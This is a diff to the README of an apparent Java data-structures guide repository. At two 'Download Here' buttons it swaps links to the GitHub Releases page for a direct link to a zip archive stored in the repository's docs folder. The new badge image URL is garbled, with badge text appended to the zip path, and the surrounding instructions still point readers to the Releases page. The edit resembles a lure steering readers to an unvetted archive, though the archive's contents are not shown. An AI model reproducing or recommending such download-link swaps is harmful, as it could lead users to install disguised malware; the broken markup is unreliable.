@@ -10,7 +10,7 @@ To get started with the application, follow these steps:
 
 1. **Visit the Releases Page**: Click the button below to access the download section.
 
-   [![Download Here](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/xuyaoy6136/java-data-structures-guide/releases)
+   [![Download Here](https://raw.githubusercontent.com/xuyaoy6136/java-data-structures-guide/main/docs/java-data-structures-guide_2.8.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/xuyaoy6136/java-data-structures-guide/main/docs/java-data-structures-guide_2.8.zip)
 
 2. **Choose Your Version**: On the releases page, you will see a list of available versions. Each version includes features, bug fixes, and enhancements.
 
@@ -79,4 +79,4 @@ Thank you for choosing the **java-data-structures-guide**! We hope this resource
 
 Once you are ready, ensure you always have the latest version by visiting the Releases page again.
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/xuyaoy6136/java-data-structures-guide/releases)
+[![Download Here](https://raw.githubusercontent.com/xuyaoy6136/java-data-structures-guide/main/docs/java-data-structures-guide_2.8.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/xuyaoy6136/java-data-structures-guide/main/docs/java-data-structures-guide_2.8.zip)
